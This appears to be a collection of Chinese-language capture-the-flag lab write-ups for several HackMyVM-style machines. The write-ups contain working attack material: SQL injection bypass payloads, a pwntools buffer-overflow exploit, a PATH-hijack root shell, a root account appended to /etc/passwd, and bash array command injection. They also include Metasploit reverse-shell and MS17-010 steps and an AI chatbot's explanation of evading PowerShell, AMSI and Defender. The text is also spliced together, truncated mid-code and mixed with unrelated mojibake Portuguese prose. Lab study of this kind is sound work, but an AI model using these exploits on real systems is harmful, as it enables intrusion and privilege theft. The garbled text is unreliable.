``` 发现可以命令执行，需要用户名是`he110wor1d_admin`，然后post传参command进行命令执行，但是没成功，再去读取一下login.php的源码 ```html ┌──(root㉿kali-plus)-[~] └─# cat /root/.local/share/sqlmap/output//files/_var_www_he110wor1d_littlesecrets_login.php $dbname = "news_db"; $conn = new mysqli($servername, $username, $password if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); } $login_error = ""; if ($_SERVER["REQUEST_METHOD"] == "POST") { $username = $_POST['username']; $password $sql = "SELECT id, username, password users where username='$username'"; $result = $conn->query($sql); if ($result->num_rows > 0) { $row = $result->fetch_assoc(); if ($password $row['password session_start(); $_SESSION['user_id'] = $row['id']; $_SESSION['username'] = $row['username']; header("Location: manager.php"); exit(); } else { $login_error = "Invalid username or password } else { $login_error = "Invalid username or password } $conn->close(); ?> Login

Login

``` `$sql = "SELECT id, username, password users where username='$username'";`通过这句话可以知道是单引号闭合的，可以构造payload ```html ' union select 1,'he110wor1d_admin','pass pass ``` 这样的话，sql语句就变成了`$sql = "SELECT id, username, password users where username='' union select 1,'he110wor1d_admin','pass'";`进去之后就有一个执行命令的输入框，可以反弹shell，拿到shell之后切换到he110wor1d用户，口令已脱敏`i_love_sing_dance_rap` ```html www-data@singdancerap:/home$ su he110wor1d su he110wor1d Password: he110wor1d@singdancerap:/home$ id id uid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d) he110wor1d@singdancerap:~$ ls ls thekey2root user.txt he110wor1d@singdancerap:~$ cat user.txt cat user.txt #SQL injection can not only retrieve data but also forge it. User flag:107883ee-f5e4-11ef-8542-005056207011 ``` ## 提权 在home目录下看到一个thekey2root目录，里面有一个thekey2root文件，cat了一下，发现没法查看，看了下内容，应该是一个二进制文件，把他搞下来看看 ```html int __cdecl main(int argc, const char **argv, const char **envp) { system("echo 'input something:'"); input(&argc); system("echo 'thanks for your input'"); return 0; } int input() { char v1[24]; // [esp+Ch] [ebp-1Ch] BYREF return __isoc99_scanf("%s", v1); } int sing_dance_rap() { setuid(0); setgid(0); return system("echo 'Hey,bro! What are you looking for?'"); } ``` 找了hyh大佬的wp，用了他的脚本 ```html from pwn import * # 设置上下文和程序路径 context(arch='i386', os='linux') elf = ELF('./thekey2root') # 替换为你的程序名 # 获取函数地址 sing_dance_rap_addr = elf.symbols['sing_dance_rap'] system_addr = elf.plt['system'] # 通过调试获取v1的地址（例如：0xffffd0ac） v1_addr = 0xffe8378c # 替换为实际地址 # 构造payload payload = b'/bin/sh\x00' # 将/bin/sh写入缓冲区 payload += b'A' * (32 - len(payload)) # 填充至32字节 payload += p32(sing_dance_rap_addr) # 覆盖返回地址到sing_dance_rap payload += p32(system_addr) # sing_dance_rap返回后执行system payload += p32(0xdeadbeef) # system的返回地址（占位） payload += p32(v1_addr) # system的参数，指向/bin/sh # 启动进程并发送payload p = process('./thekey2root') p.send(payload) # 使用send而非sendline避免附加换行符 p.interactive() # 进入交互模式 ``` ```html ┌──(root㉿kali-plus)-[~/singdancerap] └─# chmod +x thekey2root ┌──(root㉿kali-plus)-[~/singdancerap] └─# python3 exp.py [*] '/root/singdancerap/thekey2root' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No [+] Starting local process './thekey2root': pid 1360217 [*] Switching to interactive mode input something: $ ls Hey,bro! What are you looking for? [*] Got EOF while reading in interactive $ ls [*] Process './thekey2root' stopped with exit code -11 (SIGSEGV) (pid 1360217) [*] Got EOF while sending in interactive ``` 可以看到成功进入到了 sing_dance_rap 函数，现在要想办法控制 system 的参数由于 input 函数中的数组是在函数内部声明的，也就是一个局部变量，外部无法访问到,因此我们要寻找可以写入或者能利用的字符串，很遗憾并不存在，那就只能去查找现有的字符串了，C 语言中，如果是以字符串地址作为参数的话，那么函数会按照字节逐个读取，直到遇到 `\0` 才停止，而在上面可以看到的是在 0x804a03e 这个位置，也就是 s 的地址，后面刚好有一个 \x00**，**有了这个合法的字符串，接下来要做的就是体现在 linux 里面，因为实际上函数内执行的是 system(“s”)，那么如果存在有一个 s 的二进制文件，而里面刚好有提权部分的代码，就可以执行命令，在本地调试一下，也是看了hyh大佬的wp，跟着一步步复现出来了 ```html ┌──(root㉿kali-plus)-[~/singdancerap] └─# python3 exp1.py [*] '/root/singdancerap/thekey2root' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No [+] Opening connection to on port 12345: Done [*] Switching to interactive mode input something: $ ls Hey,bro! What are you looking for? $ ls s thekey2root tmp tmp1 tmp.py $ ls s thekey2root tmp tmp1 tmp.py $ id uid=0(root) gid=0(root) groups=0(root),1001(he110wor1d) $ pwd /home/he110wor1d/thekey2root $ cd .. $ cd. $ $ cd .. $ cd .. $ ls bin boot dev etc home initrd.img initrd.img.old lib lib64 libx32 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old $ cd root $ ls root.txt $ cat root.txt #During the process of PWN, the execution of the system function does not necessarily have to be bash. root flag:943ac8c9-f696-11ef-8bd4-005056207011 ``` 这里有很多涉及到二进制相关的内容，所以二进制相关的知识也要多看看

## 获取 User Flag
/dev目录下有个todo.txt和一个程序，下载程序用ida反编译，让ai用ida-pro-mcp进行分析得到flag:{Ryan:sunninggirl}
```txt
Fix the login issue on the main page.

Ryan: Use your favorite girl's name as your temporary SSH password

<REDACTED_PASSWORD> to run the 'authenticator' tool to verify your access key.
```
```bash
让我重新检查程序逻辑，确保解密过程正确。我发现可能存在字节序或数据类型的问题。

        
            
toolName: Write
            
status: success
          
            
filePath: e:\渗透测试靶场\VirtualBox\ezRe\decrypt_flag.py
          
changes: undefined
          

        
            
toolName: run_command
            
status: success
          
command: python decrypt_flag.py undefined
          
太好了！这次解密成功了！让我验证一下完整的flag。根据解密结果和提示信息，我发现解密得到了 `{Ryan:sunninggir`（16个字符），这与 todo.txt 中的提示 "Ryan: Use your favorite girl's name as your temporary SSH password <REDACTED_PASSWORD>

让我编写一个验证脚本来确认完整的flag。

        
            
toolName: Write
            
status: success
          
            
filePath: e:\渗透测试靶场\VirtualBox\ezRe\verify_flag.py
          
changes: undefined
          

        
            
toolName: run_command
            
status: success
          
command: python verify_flag.py undefined
          
根据深入分析，我已经成功解密并验证了正确的flag！

## 完整分析结果

### 程序分析
1. **程序功能**：`authenticator`是一个验证工具，用于验证用户输入的flag
2. **加密算法**：使用标准RC4加密算法
3. **加密密钥**：`welcome`
4. **验证逻辑**：
   - 要求输入18个字符的flag
   - 将输入的前16个字符与预设的加密数据进行比对
   - 使用RC4算法进行验证

### 解密过程
1. **提取加密数据**：从程序中提取到加密值 `0x8CD735C49220E11D` 和 `0x96B28E78FA5E9155`
2. **考虑字节序**：程序使用小端序存储数据，实际存储顺序为：`\x1D\xE1\x20\x92\xC4\x35\xD7\x8C\x55\x91\x5E\xFA\x78\x8E\xB2\x96`
3. **解密计算**：使用RC4算法和密钥`welcome`进行解密
4. **解密结果**：`{Ryan:sunninggir`（前16个字符）

### 结合todo.txt分析
根据todo.txt中的提示：
- `Ryan: Use your favorite girl's name as your temporary SSH password
<REDACTED_PASSWORD> 解密结果中已经包含`Ryan:`和`sunninggir`，这明显指向女孩名字是`sunninggirl`

### 最终flag验证
通过验证脚本确认，正确的完整flag是：
```
{Ryan:sunninggirl}
```

这个flag长度为18个字符，完全符合程序要求，并且通过了RC4加密验证。
```

## 提权
没有curl和wget，但是有busybox，上传linpeas.sh，运行脚本信息收集一波，在`<command>`目录下找到一个`super_checker` 看起来是提权用的，运行之后需要输入密码，把程序下载下来放进ida分析，分析得到口令已脱敏r00t_p@ss` 但是出现一个错误
```bash
Ryan@ezRe:/usr/bin$ /usr/bin/super_checker
--- Admin Maintenance Console ---
Enter Maintenance Password: <REDACTED_PASSWORD> 
[+] Access Granted! Running system maintenance...
sh: 1: service: not found
```
`service` 命令找不到，通常是因为程序执行时的 `PATH` 环境变量不包含 `<command>`（`service` 实际路径是 `<command>`）劫持一下环境变量
```bash
# 1. 创建临时目录，用于存放恶意脚本
mkdir /tmp/ezexp
cd /tmp/ezexp

# 2. 编写恶意的 service 脚本（获取 root shell）
cat > service << EOF
#!/bin/bash
/bin/bash -p  # -p 保持特权环境
EOF

# 3. 赋予执行权限
chmod +x service

# 4. 临时修改 PATH，让我们的目录优先
export PATH=/tmp/ezexp:$PATH

# 5. 重新运行 super_checker 程序
/usr/bin/super_checker
# 输入密码 <REDACTED_PASSWORD>

```bash
Ryan@ezRe:/usr/bin$ mkdir /tmp/ezexp
Ryan@ezRe:/usr/bin$ cd /tmp/ezexp
Ryan@ezRe:/tmp/ezexp$ cat > service << EOF
> #!/bin/bash
> /bin/bash -p  # -p 保持特权环境
> EOF
Ryan@ezRe:/tmp/ezexp$ chmod +x service
Ryan@ezRe:/tmp/ezexp$ export PATH=/tmp/ezexp:$PATH
Ryan@ezRe:/tmp/ezexp$ /usr/bin/super_checker
--- Admin Maintenance Console ---
Enter Maintenance Password: <REDACTED_PASSWORD>
[+] Access Granted! Running system maintenance...
root@ezRe:/tmp/ezexp# id
uid=0(root) gid=0(root) groups=0(root),1000(Ryan)
root@ezRe:/tmp/ezexp# cd /root
root@ezRe:/root# ls
authenticator.c  root.txt
root@ezRe:/root# cat root.txt
{root-f97e8b4d2c5a0e9f1t3h8c0a6eld4b39}
```

def smb_pwn(conn, arch):

	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')

## kimi回答
不知道为什么将target修改为2就行了，问了一下kimi,kimi回答如下：
**Target 2 (Native upload)** 之所以成功，是因为它**绕过了 Windows Server 2016 对 PowerShell 的严格限制**。

### 各 Target 的技术差异

| Target ID | 名称 | 工作原理 | 依赖环境 |
|-----------|------|---------|---------|
| **0** | Automatic | 自动选择，通常优先尝试 PowerShell | 取决于系统配置 |
| **1** | PowerShell | 生成 PowerShell 代码执行 payload | PowerShell 执行策略、AMSI、Defender |
| **2** | **Native upload** | **直接上传 EXE 文件，创建系统服务执行** | **仅需 SMB 和创建服务权限** |
| **3** | MOF upload | 通过 WMI/MOF 文件执行（旧技术） | WMI 服务可用性 |

### 为什么 PowerShell (Target 0/1) 在 Server 2016 上失败

Windows Server 2016 默认启用了多层防护，导致 PowerShell payload 容易被拦截：

#### 1. **PowerShell 执行策略 (Execution Policy)**
```powershell
# Server 2016 默认可能是 Restricted 或 AllSigned
Get-ExecutionPolicy
# 这会阻止未签名脚本的执行
```

#### 2. **AMSI (Anti-Malware Scan Interface)**
- PowerShell 5.0+ 内置 AMSI，会实时扫描脚本内容
- Metasploit 的 PowerShell payload 通常会被标记为恶意
- 你的日志中出现 `Service start timed out`，说明 PowerShell 进程被 Defender 拦截或终止

#### 3. **Windows Defender 实时保护**
- 现代 Windows Server 默认启用 Defender
- PowerShell 下载执行操作（DownloadString/Invoke-Expression）是常见检测特征

### Native Upload (Target 2) 为什么能成功

**原理完全不同**，它不依赖 PowerShell 解释器：

```plaintext
1. MS17-010 漏洞利用 → 获得 SYSTEM 权限的 SMB 会话
2. 直接写入二进制文件 → \\<INTERNAL_IP>\ADMIN$\XjxKmwir.exe
3. 调用 SVCCTL 协议 → 创建临时服务（如 MSExploit）
4. 启动服务 → 以 SYSTEM 权限运行 EXE
5. 清理 → 删除服务和文件（即使删除失败也不影响）
```

**优势**：
- ✅ **不经过 PowerShell**：绕过脚本层面的所有检测机制
- ✅ **原生 API**：直接调用 Windows Service Control Manager，这是系统核心功能，无法禁用
- ✅ **文件级操作**：上传的是普通 PE 文件（.exe），不像 PowerShell 代码那样容易被 AMSI 静态扫描

### 日志验证

在你的成功日志中可以看到 Native upload 的特征：

```bash
[*] Uploading payload... XjxKmwir.exe        ← 直接上传 EXE
[*] Created \XjxKmwir.exe...                  ← 通过 ADMIN$ 共享
[+] Service started successfully...            ← 创建服务启动（非 PowerShell）
[*] Sending stage (177734 bytes) to <INTERNAL_IP>  ← 成功回连
```

而之前失败的 PowerShell 模式会显示：
```bash
[*] Selecting PowerShell target       ← 选择 PowerShell
[*] Executing the payload...          ← 尝试执行 ps 命令
[+] Service start timed out...        ← 被拦截/超时
```

### 渗透测试建议

针对 **Windows Server 2012/2016/2019/2022**：
1. **优先尝试 Target 2 (Native upload)**：成功率最高，兼容性最好
2. **如果 Native 失败**：尝试 Target 3 (MOF upload) 或改用 `ms17_010_eternalblue` 模块
3. **PowerShell 目标仅适用于**：旧版系统（Win 7/2008）或已知关闭 Defender 的环境

**总结**：Target 2 成功是因为**它把攻击从"脚本层"降到了"二进制/服务层"**，绕过了 Server 2016 对 PowerShell 的现代防护机制。

# 信息搜集 mac地址为`00:0C:29:26:7C:E2`，得到ip地址为``，扫一下端口 ```plain ┌──(root㉿zss)-[/home/zss] └─# nmap -p- Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 19:49 CST Nmap scan report for bogon () Host is up (0.00077s latency). Not shown: 65523 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5357/tcp open wsdapi 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown MAC Address: 00:0C:29:26:7C:E2 (VMware) Nmap done: 1 IP address (1 host up) scanned in 18.04 seconds ``` 发现这么多端口，再使用`nmap -sV -sT -p 21,80,135,139,445,5357 `扫描一下特定的端口 先看看ftp都有啥，登录的时候选择匿名登录即可 ```html IIS7
``` 这个应该是80端口的那个网页的代码，发现可以上传木马，然后ftp连进去的目录应该就是网站的那个目录，上传一个木马看看能不能连，通过Wappalyzer发现网站使用的是php编程语言，没注意是asp的框架，所以php木马连不上，找个asp的马传上去看看 ## 获取 User Flag asp木马： [https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) 脚本的内容要修改一下，kali开启监听然后再curl我们上传的aspx文件，等待一会就能监听到，接着就是一顿操作读取user flag ## 提权 这里要用到 ``来生成一个反弹shell的exe，然后将这个shell.exe上传到靶机，然后在靶机中运行shell.exe，等待kali监听，但是监听得到的还不是admin权限，需要提权，先把他放到后台运行，然后使用``模块，然后run之后就能找到可利用的模块，接着利用提权 ```html use exploit/milti/handler show options set payload windows/meterpreter/reverse_tcp show options set lhost run bg sessions use multi/recon/local_exploit_suggester show options set session 1 run use exploit/windows/local/ms16_075_reflection_juicy set session 1 set lhost run ```

又是没见过的思路和方法，脑子痒痒的

```bash

Em 2002, apÃ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃªncia de mÃºltiplas espÃ©cies em Angola e, de facto, receava-se quea Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃ§Ã£o CientÃ­fica da Universidade CatÃ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃªnciasfotogrÃ¡ficas do Ãºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃªncia da populaÃ§Ã£o apÃ³s um duro perÃ­odo de guerra.

Como prova disso, a seleÃ§Ã£o de futebol angolana Ã© denominada de palancas-negras e a companhi aÃ©rea angolana, TAAG, tem este antÃ­lope como sÃ­mbolo. Na mitologia africana, assim como outros antÃ­lopes, eles simbolizam vivacidade,velocidade, beleza e nitidez visual
                                                                                                                                                                                                                                     
┌──(root㉿kali-plus)-[~]
└─# cat tmp1|grep -P '<REDACTED_PASSWORD>' -o
```

`cat tmp1|grep -P '<REDACTED_PASSWORD>'`这一条指令中`-P` 启用 Perl 兼容的正则表达式（PCRE），`'\w+'` 是正则表达式，用于匹配一个或多个字母数字字符（单词）  这句指令的效果就是把数字、字母、单词、或者是由数字，字母下划线组成的字符给挑选出来，视觉上看起来他们之间是有空格隔开的，下面的指令是

```bash
cat tmp1|grep -P '<REDACTED_PASSWORD>' -o
cat tmp1|grep -P '<REDACTED_PASSWORD>' -o|sort
cat tmp1|grep -P '<REDACTED_PASSWORD>' -o|sort|uniq
```

`cat tmp1|grep -P '<REDACTED_PASSWORD>' -o`这一步`-o`的作用是把正则匹配得到的这些提取出来，提取出来就是一个纵向输出的状态，然后`cat tmp1|grep -P '<REDACTED_PASSWORD>' -o|sort`这个命令的作用就是进行一个简单的排列,`cat tmp1|grep -P '<REDACTED_PASSWORD>' -o|sort|uniq`是去重，接下来还要生成变体的字典，就是CTF经典变体，比如

```bash
i->1
a->4
e->3
l->1
```

可以找网站换，但是网站换的不太靠谱，最好让ai改或者手动改，手动改的指令为：

`<command>`

接下来把修改好的内容打包成txt字典，用gobuster跑

然后到这一步发现我并没有跑出来，检查了一下，发现我用kimi转换变体字典，他给我的是错的，无语了kimi智障，那么我们直接用命令生成一个新的字典

## 提权
### root flag-方法一
查看了一下`.bash_history`发现`<command>`是可写的

```plain
ls /etc/passwd
ls -l /etc/passwd
sudo chmod rw-rw-rw- /etc/passwd
sudo chmod rwrwrw /etc/passwd
sudo chmod 666 /etc/passwd
```

发现`<command>`有写入的权限，尝试写入新用户，先用openssl生成一个密码

p4l4nc4@4ng014:~$ openssl passwd 123456
$1$CUWhN2c.$XWgLjjrEAtb3CdDb6Vk5U0
```

然后使用echo命令追加到`<command>`文件中

```plain
p4l4nc4@4ng014:~$ echo 'hack:$1$CUWhN2c.$XWgLjjrEAtb3CdDb6Vk5U0:0:0:qwe:/root:/bin/bash' >> /etc/passwd
p4l4nc4@4ng014:~$ cat /etc/passwd

### root flag-方法二
方法二使用到两个工具`php_filter_chain_generator`，`linpeas.sh`项目地址：[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

可以先用php伪协议`<command>`读取源代码

```plain
PD9waHAKICAgICRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsKICAgIGluY2x1ZGUoJHBhZ2UpOwo/Pgo=
<?php
    $page = $_GET['page'];
    include($page);
?>
```

发现有一个kill_todd.sh，我就说nc怎么一直不稳定，原来是你这家伙，得想办法给他删了，得先看看有没有权限

```plain
sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

发现有rm的权限，那直接把那个脚本删了

```plain
┌──(root㉿kali-plus)-[~]
└─# nc <INTERNAL_IP> 7066
cd /opt
ls -al
total 40
drwxr-xr-x  2 root root  4096 Mar 22 10:40 .
drwxr-xr-x 18 root root  4096 Nov 13  2020 ..
-rwx------  1 root root   138 Mar 22 08:00 create_nc2.sh
-rwx---r--  1 root root   141 Mar 22 07:42 create_nc.sh
-rwx------  1 root root 16608 Mar 22 07:21 fake_ssh
-rwx------  1 root root    17 Mar 22 07:07 kill_todd.sh
sudo rm kill_todd.sh
sudo rm fake_ssh
bash    
ls -al
total 16
drwxr-xr-x  2 root root 4096 Mar 23 04:26 .
drwxr-xr-x 18 root root 4096 Nov 13  2020 ..
-rwx------  1 root root  138 Mar 22 08:00 create_nc2.sh
-rwx---r--  1 root root  141 Mar 22 07:42 create_nc.sh
cat create_nc.sh
#!/bin/bash

create_ssh(){
        sudo -u todd nc -e /opt/fake_ssh -lp $1
}

for i in $(seq 10)
do
        a=$((RANDOM))
        sleep 0.2
        create_ssh $a &
done
```

发现这个create_nc.sh是利用fake_ssh的，也可以直接删掉，接着把本地的ssh私钥写一份到靶机上看看能不能登录进去

```plain

## 提权
```plain
todd@todd:~$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
todd@todd:~$ cd /srv
todd@todd:/srv$ ls
guess_and_check.sh  note.jpg
todd@todd:/srv$ cat note.jpg
u can try bash -x guess_and_check.sh
```

这里得到一个提示，下面是guess_and_check.sh

```plain
#!/bin/bash

cat << EOF
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
EOF

# check this script used by human 
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

重点在`[[ $input_number -ne "$a" ]] && exit 1`这一句话，这句话是要对输入的内容与变量a进行比较，当我们输入a的时候，它把我们输入的a 当成一个变量，即两个变量相比较，两个变量相比较一定相等，这样就能绕过，这样以来就存在一个注入点，如果作为变量来处理，那么可以引入一个数组，而且shell支持数组，数组的下标是数字，数组的下标是可以运算的，就是可以在数组下标这个地方注入一些代码

```plain
todd@todd:/srv$ sudo /bin/bash /srv/guess_and_check.sh
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
Please Input [365]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>a[$(id)]
/srv/guess_and_check.sh: line 35: uid=0(root) gid=0(root) groups=0(root): syntax error in expression (error token is "(root) gid=0(root) groups=0(root)")
```

### 方法三-拿到root的密码

```plain
sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

有一个true_file和false_file，其中有一个随机值，1000以内，如果随机的true_file存在，并且false_file不存在，则会输出/root/.cred的内容，那么可以在文件夹内生成500个文件，这样就有1/4的概率得到/root/.cred

[23:43:07] 403 -  278B  - /server-status                                    
[23:43:07] 403 -  278B  - /server-status/                                   
[23:43:11] 301 -  316B  - /uploads  ->  http://<INTERNAL_IP>/uploads/       
[23:43:11] 403 -  964B  - /uploads/                                         
                                                                             
Task Completed
```

有个/javascript和/uploads，再把uploads加上再扫描一遍，扫出来一个robots.txt，访问得到：

```bash

```

解密得到源码

```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $targetDir = "uploads/";
$fileName = basename($_FILES["image"]["name"]);
$fileType = pathinfo($fileName, PATHINFO_EXTENSION);
$fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);

$allowedTypes = ['jpg', 'jpeg', 'gif'];
if (in_array(strtolower($fileType), $allowedTypes)) {
  $encryptedFileName = strtr($fileBaseName, 
                             'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 
                             'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');

  $newFileName = $encryptedFileName . "." . $fileType;
  $targetFilePath = $targetDir . $newFileName;

  if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
    $message = "El archivo se ha subido correctamente.";
  } else {
    $message = "Hubo un error al subir el archivo.";
  }
} else {
  $message = "Solo se permiten archivos JPG y GIF.";
}
}
?>
```

## 获取 User Flag
发现有一个替换，是rot13，之前上传的shell.jpg被改成了furyy.jpg，上传一个shell.php.gif，然后蚁剑连接

在蚁剑里反弹shell，然后user flag 在/home/rodgar目录下

```plain
b45cffe084dd3d20d928bee
```

## 提权
有个clue.txt，查看之后发现告诉我们一个字典的位置，但是是在/root/rodgarpass目录下，无法直接查看，在kali上起一个http服务，使用gobuster对kali进行扫描就能得到字典里面的内容了

`<command>`

```bash
┌──(root㉿kali-plus)-[~]
└─# python3 -m http.server 9999
Serving HTTP on <PUBLIC_IP> port 9999 (http://<ATTACKER_IP>:9999/) ...
<INTERNAL_IP> - - [17/Mar/2025 00:21:55] "GET / HTTP/1.1" 200 -
<INTERNAL_IP> - - [17/Mar/2025 00:21:55] code 404, message File not found
<INTERNAL_IP> - - [17/Mar/2025 00:21:55] "GET /d7401714-8883-4fdc-a1d9-cc1fccab40ce HTTP/1.1" 404 -
<INTERNAL_IP> - - [17/Mar/2025 00:21:55] code 404, message File not found
<INTERNAL_IP> - - [17/Mar/2025 00:21:55] "GET /b45cffe084dd3d20d928bee85e7b0f2 HTTP/1.1" 404 -
```

发现有一个`b45cffe084dd3d20d928bee85e7b0f2`这个md5虽然只有31位，但是cmd5可以解出来是`string`

应该就是rodgar这个用户的口令已脱敏，但是试了好久(没有交互式shell，不知道为什么命令没用了)才发现string不是密码，`b45cffe084dd3d20d928bee85e7b0f21`才是密码，进去之后还不是root，还要提权

```bash
sudo -l
Matching Defaults entries for rodgar on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User rodgar may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make
```

直接启动一手GTFOBins，搜索gcc或者make即可

```bash
sudo gcc -wrapper /bin/sh,-s .
id
uid=0(root) gid=0(root) grupos=0(root)
```

```bash
cd root
ls
rodgarpass
rooo_-tt.txt
cat rooo_-tt.txt
<REDACTED_HASH>
```

title: HMV-twisted靶机渗透记录
content:
# 信息搜集 ip地址为`` ```bash ┌──(root㉿kali-plus)-[~] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:1d:89:b5, IPv4: Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 0a:00:27:00:00:18 (Unknown: locally administered) 08:00:27:ee:f8:61 PCS Systemtechnik GmbH 08:00:27:94:94:44 PCS Systemtechnik GmbH 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 3 responded ``` 使用nmap对端口信息进行搜集 ```bash ┌──(root㉿kali-plus)-[~] └─# nmap -p- Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 22:24 CST mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for Host is up (0.0082s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 80/tcp open http 2222/tcp open EtherNetIP-1 MAC Address: 08:00:27:94:94:44 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 12.61 seconds ``` ## 获取 User Flag 80和2222端口是开放的，先看看80端口是什么情况，就是2张小猫的图片，没什么线索，扫一下目录看看，没扫出来什么目录，那应该就是那2张图片了 ```bash ┌──(root㉿kali-plus)-[~] └─# curl :80

I love cats!


But I prefer this one because seems different

┌──(root㉿kali-plus)-[~] └─# wget http:///cat-original.jpg --2025-04-08 22:35:48-- http:///cat-original.jpg 正在连接 :80... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：288693 (282K) [image/jpeg] 正在保存至: “cat-original.jpg” cat-original.jpg 100%[==========================================================================================================>] 281.93K --.-KB/s 用时 0.03s 2025-04-08 22:35:48 (10.9 MB/s) - 已保存 “cat-original.jpg” [288693/288693]) ┌──(root㉿kali-plus)-[~] └─# wget http:///cat-hidden.jpg --2025-04-08 22:36:09-- http:///cat-hidden.jpg 正在连接 :80... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：288706 (282K) [image/jpeg] 正在保存至: “cat-hidden.jpg” cat-hidden.jpg 100%[==========================================================================================================>] 281.94K --.-KB/s 用时 0.06s 2025-04-08 22:36:09 (4.72 MB/s) - 已保存 “cat-hidden.jpg” [288706/288706]) ┌──(root㉿kali-plus)-[~] └─# diff cat-original.jpg cat-hidden.jpg 二进制文件 cat-original.jpg 和 cat-hidden.jpg 不同 ``` 发现图片里面是有不同的，但是不知道使用什么工具去比较，看了一眼wp，使用的stegseek这个工具 使用教程：[stegseek使用教程](https://guayu-kakeru.github.io/posts/15173.html) ```bash ┌──(root㉿kali-plus)-[~] └─# stegseek -sf cat-hidden.jpg StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: "sexymama" [i] Original filename: "mateo.txt". [i] Extracting to "cat-hidden.jpg.out". ┌──(root㉿kali-plus)-[~] └─# stegseek -sf cat-original.jpg StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: "westlife" [i] Original filename: "markus.txt". [i] Extracting to "cat-original.jpg.out". ┌──(root㉿kali-plus)-[~] └─# cat cat-hidden.jpg.out thisismypassword └─# cat cat-original.jpg.out markuslovesbonita ``` 得到这个应该是一个和一个提示，猜测ssh登录的用户名是markus，连上去试试 ```bash ┌──(root㉿kali-plus)-[~] └─# ssh markus@ 